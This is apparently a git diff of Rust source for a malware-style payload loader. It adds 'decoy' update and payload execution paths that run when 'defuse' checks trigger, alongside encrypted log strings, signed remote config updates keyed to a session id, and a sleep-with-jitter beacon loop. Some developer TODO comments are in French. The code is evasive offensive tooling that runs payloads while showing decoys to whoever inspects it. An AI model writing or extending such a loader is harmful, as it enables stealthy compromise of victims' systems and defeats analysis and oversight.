@@ -2,8 +2,9 @@ use crate::config::Config;
 use crate::dataoperation::un_apply_all_dataoperations;
 use crate::dataoperation::DataOperation;
 use crate::payload::Payload;
-use crate::payload_util::print_running_thread;
-use crate::payload_util::print_runonce;
+//use crate::payload_util::print_running_thread;
+//use crate::payload_util::print_runonce;
+use crate::payload_util::print_rundata;
 use crate::rundata::RunData;
 
 use cryptify;
@@ -82,18 +83,29 @@ pub fn run_loader() {
     config.verify_newconfig_signature(&config).unwrap();
     info!("{}{}", encrypt_string!("[+] VERIFIED!"), "\n");
 
-    let running_thread: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
-    let runonce: Vec<Payload> = vec![];
+    let running_thread_payload: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
+    let runonce_payload: Vec<Payload> = vec![];
+    let running_thread_decoy_update: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
+    let runonce_decoy_update: Vec<Payload> = vec![];
+    let running_thread_decoy_payload: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
+    let runonce_decoy_payload: Vec<Payload> = vec![];
+
     let mut run_data = RunData {
-        running_thread: running_thread,
-        runonce: runonce,
+        running_thread_payload: running_thread_payload,
+        runonce_payload: runonce_payload,
+        running_thread_decoy_update: running_thread_decoy_update,
+        runonce_decoy_update: runonce_decoy_update,
+        running_thread_decoy_payload: running_thread_decoy_payload,
+        runonce_decoy_payload: runonce_decoy_payload,
+        loop_nb: 1,
+        session_id:session_id.clone()
     };
-    let mut loop_nb = 1;
+
     loop {
         info!(
             "{}{}{}",
             encrypt_string!("[+] BEGIN LOOP "),
-            loop_nb,
+            run_data.loop_nb,
             encrypt_string!(" --------------------------------------------------------")
         );
         info!("{}{:?}", encrypt_string!("[+] Active LOADER: "), config);
@@ -101,34 +113,51 @@ pub fn run_loader() {
         info!("{}", encrypt_string!("[+] DEFUSE UPDATE config"));
         if config.stop_defuse(&config.defuse_update) {
             error!("{}", encrypt_string!("[!] DEFUSE STOP update config"));
+            config.exec_decoy_update(&mut run_data);
+            //TODO il faut terminer ici, ou laisser le choix mais permettre d'attendre que tout les thread terminent puis -> StopLoader() -> option dans cette payload, wait all thread, mais il a pas la liste des threads AAAH,
+            //TODO ici on pourrait choisir de ne pas terminer en faire une loop via un param en plus run_forever. (par exemple pas Internet)
+            //-> ou alors on fait une payload run forever qu'il ne faut utiliser que pour le decoy
+            //TODO wait all thread to finish.
+            //si on sleep pas , il est en run forever.... car il revient. ici.
+
         } else {
+            if config.decoy_defuse_update_success {
+                config.exec_decoy_update(&mut run_data);
+            }
+
             info!("{}", encrypt_string!("[+] UPDATE config"));
+            //TODO si on file une copie
             let mut running_payload: Vec<Payload> = vec![];
-            for t in &run_data.running_thread {
+            for t in &run_data.running_thread_payload {
                 running_payload.push(t.1.clone());
             }
 
+            //TODO lui filer une copie du run data plutôt, mais pas prioritaire. comme ça il pourra aussi avoir les decoy qui run
             config = config.update_config(&session_id, &running_payload);
             info!("{}", encrypt_string!("[+] DEFUSE payload exec"));
             if config.stop_defuse(&config.defuse_payload) {
                 error!("{}", encrypt_string!("[!] DEFUSE STOP the payload exec"));
+                config.exec_decoy_payload(&mut run_data);
             } else {
+                if config.decoy_defuse_payload_success {
+                    config.exec_decoy_payload(&mut run_data);
+                };
                 info!("{}", encrypt_string!("[+] PAYLOADS exec"));
                 config.exec_payloads(&mut run_data);
             }
         }
 
-        print_running_thread(&mut run_data.running_thread);
-        print_runonce(&mut run_data.runonce);
+        print_rundata(&mut run_data);
+
         //TODO wait all thread to finish -> new option
         config.sleep_and_jitt();
         info!(
             "{}{}{}{}",
             encrypt_string!("[+] END LOOP "),
-            loop_nb,
+            run_data.loop_nb,
             encrypt_string!(" ----------------------------------------------------------"),
             "\n"
         );
-        loop_nb = loop_nb + 1;
+        run_data.loop_nb = run_data.loop_nb + 1;
     }
 }
